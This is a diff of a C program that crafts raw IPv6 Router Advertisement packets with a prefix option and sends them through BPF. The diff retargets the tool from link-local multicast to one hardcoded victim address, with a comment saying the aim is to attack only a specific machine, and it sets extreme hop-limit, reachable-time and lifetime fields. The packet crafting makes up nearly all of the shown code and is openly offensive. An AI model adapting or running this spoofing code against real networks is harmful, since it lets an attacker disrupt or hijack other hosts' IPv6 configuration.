@@ -38,10 +38,16 @@
 #include <string.h>
 #include <unistd.h>
 
-/* These must match */
-#define ALL_LINKLOCAL_NODES	"FF02::1"
+/* These must match
+#define ALL_LINKLOCAL_NODES 	"FF02::1"
 #define ALL_LINKLOCAL_NODES_HW	"33:33:00:00:00:01"
-#define IP6_ADDRESS		"fe80::21d:e0ff:fe06:7421" 
+*/
+/* Forget multicast, we are supposed to attack only a specific machine */
+#define ALL_LINKLOCAL_NODES     "fe80::215:c5ff:fe33:7748"
+#define ALL_LINKLOCAL_NODES_HW	"00:15:c5:33:77:48"
+/* My Address */
+#define IP6_ADDRESS		"fe80::beae:c5ff:fe80:104"
+
 
 extern char *__progname;
 
@@ -84,30 +90,34 @@ main(int argc, char *argv[])
 	(void)strlcpy(ifreq.ifr_name, argv[1], sizeof(ifreq.ifr_name));
 	if (ioctl(bpf, BIOCSETIF, &ifreq) != 0)
 		err(1, "ioctl");
+	/* Prefix Information */
+	bzero(&nopi, sizeof(nopi));
+	nopi.nd_opt_pi_type	  = ND_OPT_PREFIX_INFORMATION;
+	nopi.nd_opt_pi_len	  = 4;
+	nopi.nd_opt_pi_prefix_len = 0x40; /* sizeof(struct in6_addr); */
+	nopi.nd_opt_pi_valid_time = 0xFFFFFFFF;
+	nopi.nd_opt_pi_prefix 	  = in6;
 	/* ICMPv6 */
 	bzero(&nra, sizeof(nra));
 	nra.nd_ra_type		  = ND_ROUTER_ADVERT;
 	nra.nd_ra_code		  = 0;
 	nra.nd_ra_cksum		  = 0;
-	nra.nd_ra_curhoplimit	  = 0;
-	nra.nd_ra_router_lifetime = 0xffff;
-	bzero(&nopi, sizeof(nopi));
-	nopi.nd_opt_pi_type	  = ND_OPT_PREFIX_INFORMATION;
-	nopi.nd_opt_pi_len	  = 4;
-	nopi.nd_opt_pi_prefix_len = sizeof(struct in6_addr);
-	nopi.nd_opt_pi_valid_time = 0xffffffff;
-	nopi.nd_opt_pi_prefix 	  = in6;
+	nra.nd_ra_curhoplimit	  = 0xFF;
+	nra.nd_ra_reachable       = 0xFFFFFFFF;
+	nra.nd_ra_router_lifetime = htons(9000);
+	nra.nd_ra_flags_reserved  = ND_RA_FLAG_OTHER;
 	/* IPv6 */
 	bzero(&ip6, sizeof(ip6));
 	ip6.ip6_vfc  = IPV6_VERSION &	IPV6_VERSION_MASK;
 	ip6.ip6_nxt  = IPPROTO_ICMPV6;
+	ip6.ip6_hops = 0xFF;
 	ip6.ip6_plen = htons(sizeof(nra) + sizeof(nopi));
 	/* ip6.ip6_plen = htons(sizeof(nra)); */
 	if (inet_pton(AF_INET6, ALL_LINKLOCAL_NODES, &ip6.ip6_dst) != 1)
 		errx(1, "inet_pton");
 	if (inet_pton(AF_INET6, IP6_ADDRESS, &ip6.ip6_src) != 1)
 		errx(1, "inet_pton");
-	/* Finish Icmp */
+	/* Finish Icmp, Checksum Calc */
 	bzero(&pih, sizeof(pih));
 	pih.src	 = ip6.ip6_src;
 	pih.dst	 = ip6.ip6_dst;
